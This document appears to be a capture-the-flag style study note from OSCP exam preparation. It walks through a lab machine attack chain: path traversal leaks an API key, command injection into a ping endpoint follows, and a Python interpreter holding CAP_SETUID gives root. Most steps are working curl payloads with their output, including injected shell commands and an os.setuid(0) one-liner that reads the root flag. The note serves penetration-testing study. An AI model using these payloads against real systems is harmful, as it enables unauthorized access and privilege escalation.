---
type: reusable-poc
project: OSCP-Exam-PoC
status: validated
updated: "2026-11-07"
related_machines:
  - ME-01
tags:
  - oscp
  - linux-privilege-escalation
  - linux-capabilities
  - cap-setuid
  - python
  - command-injection
---

# CAP_SETUID

## 1. Overview

A Linux executable was configured with the `CAP_SETUID` capability, allowing processes launched through it to change their user IDs.

The vulnerable executable was:

```
/usr/local/bin/pyadmin
```

It was a Python 3.11.18 interpreter with:

```
/usr/local/bin/pyadmin cap_setuid=ep
```

Because Python exposes the `os.setuid()` function, the capability could be used to change the interpreter process UID to `0` and execute Python code with root privileges.

**Attack chain:**

```
Path Traversal
    |
    v
API Key Disclosure
    |
    v
Authenticated Command Injection
    |
    v
Command Execution as svc (UID 1000)
    |
    v
CAP_SETUID on pyadmin
    |
    v
os.setuid(0)
    |
    v
Root-Level File Read
```

## 2. Vulnerability Details

### What is CAP_SETUID?

Linux capabilities divide traditional root privileges into individual permissions.

`CAP_SETUID` allows a process to manipulate user IDs through operations such as `setuid()`.

The executable had the following capability assignment:

```
cap_setuid=ep
```

The flags mean:

|Flag|Meaning|
|---|---|
|`e`|Effective — the capability is active when the executable runs|
|`p`|Permitted — the capability is available to the process|

This does not automatically make every process running the executable root. The executable must invoke an operation that uses the capability.

Python provides that operation through:

```
import os
os.setuid(0)
```

### Why Python?

The target executable was a Python interpreter.

Python's `os` module exposes operating-system functions, including `setuid()`. This made it possible to invoke the privileged system call directly without compiling a custom binary.

## 3. Attack Procedure

### Step 1 — Establish the target connection

The ME-01 application was exposed on port `PORT_I`.

```
BASE='http://x.x.x.x:PORT_I'
```

### Step 2 — Exploit path traversal to retrieve the API key

The application exposed a file-download endpoint:

```
/api/download?file=
```

Requesting `../config.py` disclosed the application configuration, including the API key.

The key was extracted directly from the response:

```
API_KEY=$(curl -fsS --get \
  --data-urlencode 'file=../config.py' \
  "$BASE/api/download" |
  sed -n 's/^API_KEY = "\(.*\)"$/\1/p')

printf 'Extracted key length: %s characters\n' "${#API_KEY}"
```

Observed output:

```
Extracted key length: 30 characters
```

### Step 3 — Identify the command injection

The application source contained the following vulnerable expression:

```
out = subprocess.getoutput("ping -c 1 -W 1 " + host)
```

The `host` parameter was concatenated directly into a shell command without proper input validation or escaping.

The endpoint accepted the API key through the `X-API-Key` header.

First, authentication was verified with a normal request:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=1.1.1.1' \
  "$BASE/api/ping"
```

The endpoint returned `HTTP/1.1 200 OK` and the expected ping output.

### Step 4 — Confirm command execution

A semicolon was supplied in the `host` parameter to execute an additional command:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; id' \
  "$BASE/api/ping"
```

Observed identity:

```
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

This confirmed remote command execution as `svc`.

### Step 5 — Enumerate Linux capabilities

The following checks were performed:

**SUID enumeration**

```
find / -type f -perm -4000 -ls 2>/dev/null
```

The output contained standard system binaries such as `mount`, `umount`, `su`, `passwd`, `chsh`, `chfn`, `newgrp`, and `gpasswd`. No useful SUID escalation path was identified.

**Linux capabilities**

```
getcap -r / 2>/dev/null
```

The important result was:

```
/usr/local/bin/pyadmin cap_setuid=ep
```

**Sudo enumeration**

```
sudo -n -l 2>&1
```

Result:

```
/bin/sh: 1: sudo: not found
```

The capability finding was the relevant escalation lead.

### Step 6 — Inspect the executable

The target executable was inspected using:

```
ls -l /usr/local/bin/pyadmin
readlink -f /usr/local/bin/pyadmin
/usr/local/bin/pyadmin --version
```

Observed output:

```
-rwxr-xr-x 1 root root 14472 Nov 3 11:50 /usr/local/bin/pyadmin
/usr/local/bin/pyadmin
Python 3.11.18
```

The `file` utility was unavailable in the target environment:

```
/bin/sh: 1: file: not found
```

The version output established that `pyadmin` was a Python interpreter.

Its normal permissions were `0755`; it did not have the SUID bit. The escalation came from its file capability, not SUID ownership.

### Step 7 — Test the CAP_SETUID capability

Python was invoked through the capability-bearing executable:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; /usr/local/bin/pyadmin -c "import os; print(os.getuid(), os.geteuid()); os.setuid(0); print(os.getuid(), os.geteuid())"' \
  "$BASE/api/ping"
```

The Python code:

```
import os

print(os.getuid(), os.geteuid())

os.setuid(0)

print(os.getuid(), os.geteuid())
```

Observed output:

```
1000 1000
0 0
```

Interpretation:

|Before `os.setuid(0)`|After `os.setuid(0)`|
|---|---|
|Real UID: 1000|Real UID: 0|
|Effective UID: 1000|Effective UID: 0|

**Root-level execution was confirmed.**

### Step 8 — Read the root flag

The same interpreter was used to change its UID and read the protected file:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; /usr/local/bin/pyadmin -c "import os; os.setuid(0); print(open(\"/root/root.txt\").read())"' \
  "$BASE/api/ping"
```

The root flag was retrieved successfully:

```
IT{FLAG-SECRET}
```

<badge color="success">Validated — flag submitted successfully</badge>

## 4. Technical Explanation

The escalation depended on three components working together:

1. The executable had `CAP_SETUID` in its effective and permitted capability sets.
    
2. Python exposed the `setuid()` system call through `os.setuid()`.
    
3. The process used that capability to change its real and effective UIDs to `0`.
    

The important distinction is that the original command-injection process remained `svc`. The Python child process invoked through `pyadmin` acquired UID `0`.

No interactive root shell was established or required. Root-level execution was demonstrated by changing the Python process UID and reading `/root/root.txt`.

## 5. Enumeration Takeaways

Do not restrict Linux privilege-escalation enumeration to SUID and sudo.

Include filesystem capability enumeration:

```
getcap -r / 2>/dev/null
```

Pay particular attention to capabilities assigned to interpreters and utilities capable of invoking privileged system calls.

Examples of relevant capability names include:

|Capability|General purpose|
|---|---|
|`CAP_SETUID`|Manipulate user IDs|
|`CAP_SETGID`|Manipulate group IDs|
|`CAP_DAC_OVERRIDE`|Bypass discretionary file permission checks|
|`CAP_SYS_ADMIN`|Broad system administration operations|

A capability assignment is a lead, not automatic proof of exploitable privilege escalation. Inspect the executable and determine how its functionality can use the assigned capability.

## 6. Evidence and Scope

|Evidence|Confirmed result|
|---|---|
|Initial execution identity|`svc`, UID 1000|
|Capability-bearing executable|`/usr/local/bin/pyadmin`|
|Capability|`cap_setuid=ep`|
|Interpreter version|Python 3.11.18|
|UID before escalation|`1000`|
|UID after escalation|`0`|
|Protected file|`/root/root.txt`|
|Objective|Root flag retrieved and submitted|

The target filesystem contained `/.dockerenv`, indicating a containerized environment. The confirmed result is root-level execution within the challenge environment; no host-level container escape was demonstrated.

## 7. Related Notes

- [[Difficulty Levels/Medium/ME-01/ME-01 Overview]]
    
- [[Reusable PoCs/Linux Privilege Escalation/LD_PRELOAD]]
    
- [[Reusable PoCs/Linux Privilege Escalation/Tar Wildcard Injection]]
    

## 8. Key Lesson

During Linux privilege-escalation enumeration, always inspect file capabilities.

A Python interpreter with `CAP_SETUID=ep` can provide a direct route to UID 0 through `os.setuid(0)`, even when the executable has ordinary `0755` permissions and no SUID bit.